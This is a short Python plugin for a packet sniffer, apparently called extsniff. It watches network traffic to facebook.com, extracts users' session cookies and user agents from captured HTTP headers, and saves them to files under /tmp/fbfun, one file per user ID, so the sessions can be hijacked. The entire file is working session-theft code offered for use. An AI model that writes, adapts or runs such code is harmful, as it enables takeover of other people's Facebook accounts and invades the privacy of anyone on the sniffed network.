# fbfun plugin for extsniff
L_HOOKS = dict()
G_HOOKS = dict()
L_HOOKS['url'] = 'facebook.com/'
L_HOOKS['module'] = 'facebook.hijackFacebook'
G_HOOKS['url'] = 'facebook.com/'
G_HOOKS['module'] = 'facebook.hijackFacebook'

def hijackFacebook(Headers, ipsrc='', hook='', pkt='', session=''):
    import os,re

    if Headers['headers'].has_key('cookie'):
        cookiename = re.findall("c_user=([0-9]+)", Headers['headers']['cookie'][0])

        if not cookiename:
            return "WARNING: Wrong c_user value for facebook: "+cookiename

        if not os.path.exists("/tmp/fbfun"):
            os.mkdir("/tmp/fbfun")

        # cookie was transsfered, lets save it for fun
        if not os.path.exists("/tmp/fbfun/"+cookiename[0]):
            fbfunCookie = open("/tmp/fbfun/"+cookiename[0], "w")
            fbfunCookie.write(Headers['headers']['cookie'][0]+"\n")

            # set default useragent if nothing was captured
            if not Headers['headers'].has_key('user-agent'):
                Headers['headers']['user-agent'] = 'Mozilla/5.0 (X11; U; Ubuntu Linux; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/11.0.696.3'
            
            # finally close the file
            fbfunCookie.write(Headers['headers']['user-agent'][0])
            fbfunCookie.close()
        
